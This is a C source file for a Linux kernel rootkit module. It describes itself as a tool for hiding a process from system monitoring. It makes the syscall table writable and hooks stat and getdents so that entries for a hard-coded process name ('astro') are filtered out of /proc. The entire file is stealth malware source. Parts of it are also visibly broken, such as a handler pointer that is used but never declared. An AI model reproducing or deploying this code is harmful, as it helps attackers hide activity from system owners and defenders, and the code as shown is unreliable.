#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>

#define MAX_PATH 100

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Daniel Niv");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("A Rootkit for hiding a process from system monitoring services");

// the module parameters
unsigned long kallsyms_lookup_addr;
char *hiding_name;
module_param(hiding_name, charp, S_IRUGO); 
MODULE_PARM_DESC(hiding_name, "the process name to hide");

struct linux_dirent {
    unsigned long  d_ino;       /* Inode number */
    unsigned long  d_off;       /* Offset to next linux_dirent */
    unsigned short d_reclen;    /* Length of this linux_dirent */
    char           d_name[];    /* Filename (null-terminated) */
};

// defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handlers
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *sys_call_table;
asmlinkage int (*old_stat)(const struct pt_regs *regs);

char proc_path[MAX_PATH];

// function to change addr page to rw.
int set_addr_rw(unsigned long _addr) {
    unsigned int level;
    pte_t *pte;
    pte = lookup_address(_addr, &level);

    if (pte->pte &~ _PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }

    return 0;
}

// function to change addr page to ro.
int set_addr_ro(unsigned long _addr) {
    unsigned int level;
    pte_t *pte;
    pte = lookup_address(_addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;

    return 0;
}

// function that sets buffer to correct string: '/proc/hiding_name'
void init_buffer(void) {
    strcpy(proc_path, "/proc/");
    strcat(proc_path, hiding_name);
}

asmlinkage int new_stat(const struct pt_regs *regs) {
    char *path = (char*) regs->di;

    if ((strstr(path, "/proc/") != NULL) && (strstr(path, "/stat") != NULL || strstr(path, "/statm") != NULL)) {
        char *pid_str = strrchr(path, '/') + 1;
        char proc_name[256];
        sprintf(proc_name, "[%s]", hiding_name);

        if (strstr(path, hiding_name) != NULL || strstr(path, proc_name) != NULL) {
            return -1;
        }
    }

    return (*old_stat)(regs);
}
asmlinkage int new_getdents(const struct pt_regs *regs) {
    int ret;
    struct linux_dirent *curr = (struct linux_dirent*)regs->si;
    int i = 0;
    ret = (*old_getdents)(regs);

    while (i < ret) {
        if (!strcmp(curr->d_name, hiding_name)) {
            int reclen = curr->d_reclen;
            char *next = (char*)curr + reclen;
            int len = (int)regs->si + ret - (uintptr_t)next;
            memmove(curr, next, len);
            ret -= reclen;
            continue;
        }

        i += curr->d_reclen;
        curr = (struct linux_dirent*)((char*)regs->si + i);
    }

    return ret;
}

static int __init rootkit_init(void) {
    hiding_name = "astro"; // Set the process name to hide
    init_buffer();
    kallsyms_lookup_name = (void*) kallsyms_lookup_addr;
    sys_call_table = (unsigned long*)(*kallsyms_lookup_name)("sys_call_table");
    set_addr_rw((unsigned long) sys_call_table);
    old_stat = (void*) sys_call_table[__NR_stat];
    old_getdents = (void*) sys_call_table[__NR_getdents];
    sys_call_table[__NR_stat] = (unsigned long) new_stat;
    sys_call_table[__NR_getdents] = (unsigned long) new_getdents;
    set_addr_ro((unsigned long) sys_call_table);

    return 0;
}

static void __exit rootkit_exit(void) {
    set_addr_rw((unsigned long) sys_call_table);
    sys_call_table[__NR_stat] = (unsigned long) old_stat;
    sys_call_table[__NR_getdents] = (unsigned long) old_getdents;
    set_addr_ro((unsigned long) sys_call_table);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
